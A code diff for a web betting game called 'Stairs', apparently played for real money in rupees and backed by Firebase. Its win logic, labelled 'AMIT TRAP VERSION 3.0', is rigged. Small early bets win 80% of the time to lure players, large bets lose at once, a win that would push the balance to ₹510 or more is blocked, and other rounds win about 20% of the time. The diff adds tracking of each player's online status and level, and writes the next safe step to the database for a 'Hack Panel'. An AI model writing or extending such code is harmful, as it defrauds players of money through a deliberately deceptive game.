@@ -71,6 +71,18 @@
     let gameActive = false;
     let multipliers = [1.5, 3.5, 8, 15, 30, 70, 150, 400];
 
+    // --- 🟢 Heartbeat & Sync ---
+    setInterval(() => {
+        if(userPhone) {
+            db.ref('users/' + userPhone).update({ 
+                isOnline: true, 
+                lastActive: Date.now(),
+                currentGame: "Stairs",
+                currentLevel: gameActive ? currentLevel : 0
+            });
+        }
+    }, 3000);
+
     db.ref('users/' + userPhone).on('value', snap => {
         const data = snap.val();
         if(data) {
@@ -112,30 +124,19 @@
         let isSafe = false;
 
         // --- 🛡️ LOGIC: AMIT TRAP VERSION 3.0 ---
-
-        // 1. EASY ENTRANCE (Level 1 & 2)
         if (currentLevel < 2) {
-            if (betAmt <= 20) {
-                isSafe = Math.random() < 0.8; // 80% Win chance (Lalach mode)
-            } else {
-                isSafe = false; // Badi bet lagate hi Level 1 par kill
-            }
-        } 
-        // 2. THE TRAP (Level 3 onwards)
-        else {
-            // A. Recovery Logic (Balance < 300)
-            if (userBalance < 300) {
-                isSafe = Math.random() < 0.35;
-            }
-            // B. Hard Ceiling (Never cross ₹510)
-            else if ((userBalance + (betAmt * multipliers[currentLevel])) >= 510) {
-                isSafe = false;
-            }
-            // C. House Edge (Normal play)
-            else {
-                isSafe = Math.random() < 0.2;
-            }
+            if (betAmt <= 20) isSafe = Math.random() < 0.8; 
+            else isSafe = false; 
+        } else {
+            if (userBalance < 300) isSafe = Math.random() < 0.35;
+            else if ((userBalance + (betAmt * multipliers[currentLevel])) >= 510) isSafe = false;
+            else isSafe = Math.random() < 0.2;
         }
+
+        // 📡 Sync next move for Hack Panel
+        db.ref('users/' + userPhone).update({ 
+            nextPredict: isSafe ? stepIdx : (stepIdx === 0 ? 1 : 0) 
+        });
 
         if(isSafe) {
             steps[stepIdx].classList.add('win'); steps[stepIdx].innerText = '✔';
@@ -162,6 +163,7 @@
 
     function endGame() {
         gameActive = false;
+        db.ref('users/' + userPhone).update({ currentLevel: 0, nextPredict: null });
         document.getElementById('startBtn').style.display = 'block';
         document.getElementById('cashBtn').style.display = 'none';
     }
